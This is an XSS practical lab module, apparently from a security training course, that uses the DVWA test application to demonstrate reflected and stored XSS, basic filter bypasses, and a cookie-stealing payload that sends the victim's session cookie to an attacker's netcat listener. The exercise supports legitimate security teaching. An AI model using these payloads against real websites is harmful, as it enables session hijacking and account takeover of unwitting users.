# Module 09: XSS Practical Lab

### Task 1: Reflected XSS
1. Use a vulnerable lab (e.g., DVWA "XSS (Reflected)" level Low).
2. Enter `<script>alert('Hacked!')</script>` in the input field.
3. Observe the alert box.
4. Analyze the URL. Copy the URL and send it to a "victim" (another browser tab) and see the alert trigger automatically.

### Task 2: Stored XSS
1. Go to the "XSS (Stored)" section in your lab.
2. In the guestbook/comment section, enter:
   `<script>alert('You have been pwned!')</script>`
3. Refresh the page. Notice the alert triggers every time the page loads.
4. Try a more stealthy payload: `<img src=x onerror=alert(document.domain)>`.

### Task 3: Stealing a Cookie
1. Start a listener on your Kali machine: `nc -lvnp 8080`.
2. Inject the following payload into a vulnerable field:
   `<script>document.location='http://<your_kali_ip>:8080/?cookie='+document.cookie</script>`
3. When the victim views the page, check your Netcat terminal. You should see the victim's session cookie in the GET request.

### Task 4: Bypassing Basic Filters
1. Set the lab difficulty to "Medium".
2. Try the basic `<script>` tag. It will likely be deleted.
3. Try using uppercase: `<sCrIpT>alert(1)</sCrIpT>`.
4. Try using an image tag: `<img src=x onerror=alert(1)>`.
